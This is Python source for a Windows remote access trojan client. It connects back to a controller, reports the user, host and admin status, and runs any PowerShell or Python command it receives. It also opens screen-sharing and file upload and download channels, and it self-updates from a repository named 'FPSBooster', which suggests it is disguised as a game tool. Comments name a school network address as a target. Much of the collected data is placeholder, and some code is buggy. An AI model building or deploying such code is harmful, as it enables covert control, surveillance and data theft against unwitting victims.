import socket
import subprocess
import os
import platform
from threading import Thread
from datetime import datetime
import ctypes
import psutil
import uuid
from multiprocessing import Process
import time
import requests
import sys
import zipfile
import json
import getpass

from modules.screenshare import ScreenShare
from modules.fileupload import FileTransfer
from modules.filedownload import FileDownload


user32 = ctypes.WinDLL('user32')
kernel32 = ctypes.WinDLL('kernel32')

HWND_BROADCAST = 65535
WM_SYSCOMMAND = 274
SC_MONITORPOWER = 61808
GENERIC_READ = -2147483648
GENERIC_WRITE = 1073741824
FILE_SHARE_WRITE = 2
FILE_SHARE_READ = 1
FILE_SHARE_DELETE = 4
CREATE_ALWAYS = 2


class RAT_CLIENT:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.curdir = os.getcwd()
        self.command_history = []

        # TODO: Add a function to check if the RAT is up to date
        # self.check_version()

        self.screenshareClient = ScreenShare()

        # School ip: 192.168.98.223
        self.file_upload_manager = FileTransfer(
            "localhost", 4440
        )

        self.file_transfer_thread = Thread(
            target=self.file_upload_manager.connect
        )
        self.file_transfer_thread.start()

        self.file_download_manager = FileDownload(
            "localhost", 4441
        )

        self.file_download_thread = Thread(
            target=self.file_download_manager.connect
        )
        self.file_download_thread.start()

    def build_connection(self):
        try:
            global s
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            connected = False
        except Exception as e:
            print(f"Main Socket -> Error creating socket: {str(e)}")
            time.sleep(5)  # Wait for 5 seconds before retrying

        while not connected:
            try:
                s.connect((self.host, self.port))
                s.send(self.gather_info().encode())
                connected = True
            except Exception as e:
                print(f"Main Socket -> Error connecting: {str(e)}")
                time.sleep(5)  # Wait for 5 seconds before retrying

    def gather_info(self):
        # Switch out with actual info
        system_info = {
            # get ipv4 from psutil:
            "IPv4": psutil.net_if_addrs()['Ethernet'][1].address,
            "ComputerName": os.environ["COMPUTERNAME"],
            "OS": platform.system(),
            "Architecture": platform.architecture()[0],
            "Username": getpass.getuser(),
            "Country": "United States",  # Replace with actual country detection
            "City": "New York",  # Replace with actual city detection
            "Location": {
                "Latitude": "40.7128",  # Replace with actual latitude
                "Longitude": "-74.0060",  # Replace with actual longitude
            },
            "ISP": "ISP1",  # Replace with actual ISP detection
            "Timezone": "EST",  # Replace with actual timezone detection
            "Organization": "Org1",  # Replace with actual organization detection
            "Postal": "12345",  # Replace with actual postal code detection
            "ConnectionType": "Cable",  # Replace with actual connection type detection
            "Region": "US",  # Replace with actual region detection
            "RegionName": "New York",  # Replace with actual region name detection
        }

        optional_info = {
            "Microsoft Defender": "Enabled",  # Replace with actual status detection
            "Antivirus": "AVG",  # Replace with actual antivirus detection
            "Firewall": "Enabled",  # Replace with actual firewall status detection
            "Uptime": str(
                round(
                    (psutil.boot_time() - psutil.boot_time()) / 3600,
                    2,
                )
            ) + " hours",
            "Idle Time": str(
                round(
                    (psutil.cpu_times().idle) / 3600,
                    2,
                )
            ) + " hours",
            "Privileges": ctypes.windll.shell32.IsUserAnAdmin(),
            "Bit": platform.architecture()[0],
            "Rat-Ted Version": "1.0",
            "ComputerID": "123456",  # Replace with actual computer ID
            "Current Directory": os.getcwd(),
        }

        client_info = {
            "System Info": system_info,
            "Optional Info": optional_info,
            "Browsers": {
                "Chrome": {
                    "Version": "93.0.4577.82",
                    "Cookies": [],
                    "History": [],
                    "Bookmarks": [],
                    "Passwords": [],
                    "Autofill": [],
                    "Extensions": [],
                    "Downloads": []
                },
                "Firefox": {
                    "Version": "91.0",
                    "Cookies": [],
                    "History": [],
                    "Bookmarks": [],
                    "Passwords": [],
                    "Autofill": [],
                    "Extensions": [],
                    "Downloads": []
                },
                # Add other browsers here
            },
            "Computer Hardware": {
                "CPU": "Intel Core i7",
                "GPU": "NVIDIA GeForce RTX 3080",
                "RAM": "32 GB",
                "Motherboard": "ASUS ROG Strix Z590",
                "Storage": {
                    "Total": "1 TB SSD",
                    "Free": "500 GB"
                },
                "Audio": "Realtek HD Audio",
                "USB Devices": [
                    "USB Mouse",
                    "USB Keyboard",
                    "USB Flash Drive"
                ]
            },
            "Network Info": {
                "Network Adapter": {
                    "Name": "Ethernet",
                    "Status": "Connected",
                    "Speed": "1 Gbps",
                    "Type": "Wired"
                },
                "Network Speed": "100 Mbps",
                "Network Type": "Wi-Fi",
                "Network Status": "Connected",
                "Network Usage": {
                    "Upload": "1.2 MB/s",
                    "Download": "5.3 MB/s"
                },
                "Network Connections": [
                    {
                        "IP": "192.168.1.2",
                        "Port": 80,
                        "Protocol": "HTTP"
                    },
                    # Add more connections here
                ]
            }
        }

        # Convert the dictionary to a string and return it
        return json.dumps(client_info)

    def execute(self):
        while True:
            command = s.recv(100024).decode()
            try:
                command = command.split("|", 1)
                command_type = command[0].split("command_type")[
                    1].replace(":", "")
                command_cmd = command[1].split("command")[1].replace(":", "")

                if command_type == "function":
                    output = self.handle_function(command_cmd)
                elif command_type == "python":
                    output = subprocess.check_output(
                        ["python", "-c", command_cmd],
                        stderr=subprocess.STDOUT,
                        shell=True,
                        text=True
                    ).strip()
                else:
                    # Execute PowerShell command
                    process = subprocess.Popen(
                        ["powershell.exe", "-Command", command_cmd],
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        stdin=subprocess.PIPE,  # Open a pipe for input
                        shell=True,
                        text=True
                    )
                    # Send a newline to handle input prompts
                    out, err = process.communicate(input="\n")
                    if process.returncode == 0:
                        result = out.strip()
                        error = None
                    else:
                        result = None
                        error = err.strip()
                        if not result and error:
                            # Handle the case where there is an error message but no result
                            result = error.strip()
                    output = {
                        "result": result,
                        "error": error
                    }

            except Exception as e:
                print("Error executing command:", str(e))
                output = {
                    "result": None,
                    "error": str(e)
                }

            # Send the output as a JSON string
            s.send(json.dumps(output).encode())

    def extract_error_type(self, error_message):
        # Extract the error type from the PowerShell error message
        lines = error_message.split('\n')
        if len(lines) > 1:
            error_line = lines[1].strip()
            if error_line.startswith("At line:") and "ErrorId" in error_line:
                parts = error_line.split(":")
                if len(parts) > 2:
                    error_type = parts[2].strip()
                    return error_type

        return "UnknownError"  # Default to "UnknownError" if error type cannot be extracted

    def handle_function(self, function_name):
        if function_name == "screen_share":
            # Use the self.screenshareClient object to start the screenshare but in a separate process
            self.screen_share_process = Process(
                target=self.screenshareClient.start_screenshare)
            self.screen_share_process.start()
            return "Screen share started successfully at port 8080"
        elif function_name == "stop_screen_share":
            # Stop the screenshare
            self.screenshareClient.stop_screenshare()
            # Terminate the process
            self.screen_share_process.terminate()
            return "Screen share stopped successfully"

    def check_version(self):
        self.github_version = requests.get(
            "https://raw.githubusercontent.com/lukasolsen/FPSBooster/main/ver.txt"
        ).text.strip()
        print("Github version:", self.github_version)
        # The text file should just look like this: 1.0.0
        # Open up our own version file and read the version
        with open("ver.txt", "r") as f:
            current_version = f.read().strip()

        print("Current version:", current_version)

        if self.github_version != current_version:
            # The versions are different, so we need to update
            # Download the new version
            print("Versions are different")
            self.download_new_version(self.github_version)

    def download_new_version(self):
        # Download the new version
        response = requests.get(
            "https://github.com/lukasolsen/FPSBooster/archive/main.zip")
        # Write the zip file to disk
        print("Writing zip file to disk")
        with open("new_version.zip", "wb") as f:
            f.write(response.content)
        # Extract the zip file
        with zipfile.ZipFile("new_version.zip", "r") as zip_ref:
            zip_ref.extractall()
        # Delete the zip file
        os.remove("new_version.zip")
        print("Zip file deleted")
        # Delete the old version
        os.remove("ver.txt")
        # Rename the new version
        print("Renaming new version")
        os.rename("FPSBooster-main", "FPSBooster")
        # Write the new version to a file
        print("Writing new version to file")
        with open("ver.txt", "w") as f:
            f.write(self.github_version)
        print("New version written to file")
        # Restart the RAT
        subprocess.Popen(["python", "main.pyw"])
        print("Restarting RAT...")
        # Exit the current RAT
        sys.exit(0)


if __name__ == '__main__':
    # for school: 192.168.98.223
    rat = RAT_CLIENT('localhost', 4444)

    while True:
        try:
            rat.build_connection()
            rat.execute()
        except Exception as e:
            print(f"Error in main loop: {str(e)}")
            time.sleep(5)  # Wait for 5 seconds before retrying
